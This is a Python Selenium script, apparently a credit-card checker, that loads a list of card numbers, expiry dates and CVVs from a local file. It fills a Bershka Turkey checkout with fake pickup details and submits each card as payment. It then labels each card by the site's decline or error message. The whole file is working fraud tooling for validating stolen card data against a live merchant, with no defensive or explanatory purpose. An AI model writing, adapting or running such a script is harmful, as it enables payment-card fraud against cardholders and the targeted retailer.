import os
import random
import string
import sys
from http import client
from time import sleep
from typing import BinaryIO, Text
from colorama import Fore, Back, Style, init


from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support import expected_conditions
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support import select
from selenium.webdriver.support.select import Select
from selenium.webdriver.support.ui import Select
from selenium.webdriver.support.wait import WebDriverWait


def funct():
    CCList = open(r'/home/kali/Masaüstü/Register User/cc.txt', "r", encoding="utf8").read().splitlines()
    kartlar = []

    for i in CCList:
        bolum = i.split('|')
        kartlar.append((bolum[0], bolum[1], bolum[2], bolum[3]) ,)

    return kartlar


letters = ["a", "b","c", "d","e", "f","g", "h","i", "j","k", "l","m", "n",
           "o", "p","q", "r","s", "t","u", "v","w", "x","y", "z",]
def random_char(char_num):
       return ''.join(random.choice(string.ascii_letters) for _ in range(char_num))

user_agent = "Mozilla/5.0 (Linux; Android 6.0; HTC One X10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36"
caps = webdriver.DesiredCapabilities.CHROME.copy() 
caps['acceptInsecureCerts'] = True
options = webdriver.ChromeOptions()
options.add_experimental_option("excludeSwitches", ["enable-logging"])
options.add_argument('--silent')
options.add_argument('--lang=tr')
options.add_argument('--disable-gpu')
options.add_argument('--ignore-certificate-errors')
options.add_argument('--no-sandbox')
#options.add_argument('--headless')
driver = webdriver.Chrome(executable_path=r'/home/kali/Masaüstü/Register User/chromedriver', options=options)
driver.set_window_size(360,640)
#driver = webdriver.Firefox(profile, options=options)
wait = WebDriverWait(driver, 25, poll_frequency=1)
init(autoreset=True)
while True:

        print('Starting ..')
        driver.delete_all_cookies()
        driver.get("https://www.bershka.com/tr/3%E2%80%99l%C3%BC-desenli-%C3%A7orap-paketi.-c0p102944194.html?colorId=800")
        sleep(2)
        wait.until(EC.presence_of_element_located((By.ID, 'onetrust-accept-btn-handler'))).click()
        wait.until(
        EC.presence_of_element_located((By.CSS_SELECTOR, '.button-text'))).click()
        #driver.find_element_by_css_selector('.button-text').click()
        sleep(2)
        driver.get("https://www.bershka.com/tr/checkout.html")
        sleep(2)
        wait.until(
             EC.presence_of_element_located((By.XPATH, '//*[@id="shipping-wrapper"]/div[1]/shipping-methods/shipping-method[1]/div/span'))
        ).click()
        driver.find_element_by_css_selector('.ellipsis').click()
        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '#store-search'))).send_keys('a')
        sleep(1)
        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, 'button.inverse:nth-child(2)'))).click()
        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, 'bsk-store-address.stores-address-container:nth-child(1) > div:nth-child(1)'))).click()
        wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[1]/div"))).click()
        wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[1]/div/input"))).send_keys("ahe3eds")
        driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[2]/div/input").click()
        driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[2]/div/input").send_keys("limkd3ert")
        driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[3]/div/input").click()
        driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[3]/div/input").send_keys("ka3532s39et@mail.com")
        driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[4]/phone-field/ng-form/ul/li[2]/div/input").click()
        driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[4]/phone-field/ng-form/ul/li[2]/div/input").send_keys("5344443565")
        driver.find_element_by_xpath("//*[@id='summary-wrapper']/div/div[2]/div/div/cta-checkout/div/div/div[2]/div").click()
        sleep(1)
        driver.find_element_by_css_selector("#summary-wrapper > div > div.summary-cta > div > div > cta-checkout > div > div > div.cta-checkout-post > div > button").click()
        value=input(" Kart Tipini Seçiniz :\nVisa    :    [1]  : \nMastercard : [2]  :")
        if value =='1':
            wait.until(EC.presence_of_element_located(((By.CSS_SELECTOR, '.payment-19-info > span:nth-child(1)')))).click()
            print(f'Seçim [1]: Visa Seçildi ..') 
            
        elif value == ('2'):
            wait.until(EC.presence_of_element_located(((By.CSS_SELECTOR, '.payment-20-info > span:nth-child(1)')))).click()
            print(f'Seçim [2] Mastercard Seçildi ..')
             
        else: 
           print('Yanlış Seçim Yaptınız..')
           print('Yanlış Seçim Yaptınız..')
           print('Yanlış Seçim Yaptınız..')
           print('Yanlış Seçim Yaptınız..')
           break
           
         
        tikli = False
        kartlar = funct()
        for (cc, mm, yy, cvv) in kartlar:
            wait.until(
             EC.presence_of_element_located((By.XPATH, '/html/body/div[20]/div[1]/div[2]/div/checkout-payment/div/div/div[1]/form/div[1]/payment-credit-card/ng-form/ul/li[1]/div/input'))
            ).clear()
            wait.until(
             EC.presence_of_element_located((By.XPATH, '/html/body/div[20]/div[1]/div[2]/div/checkout-payment/div/div/div[1]/form/div[1]/payment-credit-card/ng-form/ul/li[1]/div/input'))
            ).send_keys(cc)
            wait.until(
             EC.presence_of_element_located((By.NAME, "month"))
            ).click()
            wait.until(
             EC.presence_of_element_located((By.NAME, "month"))
            ).send_keys(mm)          
            wait.until(
            EC.presence_of_element_located((By.NAME, "year"))
            ).click  
            wait.until(
            EC.presence_of_element_located((By.NAME, "year"))
            ).send_keys(yy)  
            wait.until(
            EC.presence_of_element_located((By.NAME, "cvv2"))
            ).clear()
            wait.until(
            EC.presence_of_element_located((By.NAME, "cvv2"))
            ).send_keys(cvv)
            wait.until(
            EC.presence_of_element_located((By.NAME, "holder"))
            ).clear()
            driver.find_element_by_name("holder").send_keys("alicae ase") 
            try:
                sleep(1)
                dropdown = driver.find_element(By.NAME, "paymentModeId")
            except:continue
            dropdown = driver.find_element(By.NAME, "paymentModeId")
            try:
                dropdown.find_element(By.XPATH, "//option[. = 'Tek Çekim Ödeme']").click()
            except: continue    
            x=driver.find_element_by_name("number").is_displayed()
            if tikli == False:
               driver.find_element_by_name("privacyPolicy").click()
            tikli = True
            driver.find_element_by_css_selector(".ellipsis").click()
            driver.execute_script("window.scrollTo(0,0)")
            sleep(3)            
                 #print(EC.presence_of_element_located(By.CSS_SELECTOR, '.checkout--error--2RoAR > .checkout--right-col--1y9nm > span')).text
                 #print(EC.presence_of_element_located(By.CSS_SELECTOR, '.checkout--error--2RoAR > div:nth-child(2) > span:nth-child(1)')).text
            hata2 = ('Hata oldu. Lütfen daha sonra tekrar deneyiniz. Problemin devam etmesi durumunda bizimle iletişime geçiniz.')
            hata1 = ('Sipariş tamamlanamadı. İşlem reddedildi. Girdiğiniz bilgileri kontrol edin veya farklı bir ödeme yöntemi deneyin.')
            hata3 = ('Transaction not completed. Enter the expiry date on your card')
            try:
                yazi = driver.find_element(By.CSS_SELECTOR, ".message").text
                if yazi == hata1 :
                    print(Fore.GREEN +yazi," :", cc,"|",mm,"|",yy,"|",cvv,)
                elif yazi == hata2 :
                    print(Fore.GREEN +yazi," :",cc,"|",mm,"|",yy,"|",cvv,)
                elif yazi == hata3 :
                    print(Fore.GREEN + yazi," :",cc,"|",mm,"|",yy,"|",cvv,)
                else :
                    print(Fore.RED + '!!! -HATA OLDU AQ- !!! : ',cc,"|",mm,"|",yy,"|",cvv,)     
             #driver.find_element_by_xpath("//p[contains(.,'Sipariş tamamlanamadı. İşlem reddedildi. Girdiğiniz bilgileri kontrol edin veya farklı bir ödeme yöntemi deneyin.')]" or "//p[contains(.,'Transaction not completed. Enter the expiry date on your card')]")
             #print('--İşlem reddedildi-- : ',cc,"|",mm,"|",yy,"|",cvv,)
                driver.find_element_by_css_selector(".ui-button").click()
             #('Hata oldu. Lütfen daha sonra tekrar deneyiniz. Problemin devam etmesi durumunda bizimle iletişime geçiniz.'):
                 #print('!!! -HATA OLDU- !!! : ',cc,"|",mm,"|",yy,"|",cvv,) 
            except:
                print(Fore.RED + '!!! -HATA OLDU- !!! : ',cc,"|",mm,"|",yy,"|",cvv,)
                driver.refresh()
                driver.refresh()
                tikli = False
                sleep(1)
                continue
